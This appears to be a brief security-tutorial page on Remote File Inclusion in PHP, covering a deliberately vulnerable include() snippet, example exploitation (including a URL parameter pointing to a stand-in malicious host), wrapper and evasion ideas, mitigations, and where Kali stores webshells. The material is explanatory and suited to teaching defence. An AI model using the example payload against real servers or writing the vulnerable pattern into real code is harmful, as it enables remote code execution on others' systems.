# RFI

**Remote File Inclusion (RFI)** is a type of vulnerability that allows an attacker to include and execute remotely hosted files within a web application. This can lead to remote code execution, data theft, or full system compromise.

**How RFI Works**

* Occurs when a web application dynamically includes external files or scripts from remote servers.
* Attackers manipulate input (e.g., URL parameters) to point to external malicious files, leading to execution of the attacker-controlled code on the server.

**Typical Vulnerable Code Patterns**

* Code that includes files based on user input without proper validation or sanitization.
*   Example of vulnerable PHP code:

    ```php
    $file = $_GET['file'];
    include($file);
    ```

**Exploitation Techniques**

* **Direct Inclusion**: Attacker hosts malicious code on a server and uses the vulnerable parameter to include it. For example, `?file=http://malicious.com/malicious_code.php`.
* **Indirect Inclusion**: Attacker uses third-party sites (like pastebin) to host the malicious code and includes it via the vulnerable parameter.

**Mitigation Strategies**

* **Input Validation**: Ensure only local or trusted files can be included, avoiding dynamic inclusion based on external input.
* **Configuration**: Set `allow_url_include` to `Off` in `php.ini` to prevent the inclusion of remote files.
* **Update and Patch**: Keep PHP and other server software up-to-date to ensure known vulnerabilities are patched.

**Advanced RFI Techniques**

* **Wrapper Techniques**: Similar to LFI, attackers might use PHP wrappers (`php://input`, `data://`) in conjunction with RFI to bypass filters or execute non-standard payloads.
* **Filter Evasion**: Employing encoding or obfuscation to slip malicious payloads past input validation mechanisms.

{% hint style="info" %}
you can find webshells in kali linux under `/usr/share/webshells/`
{% endhint %}
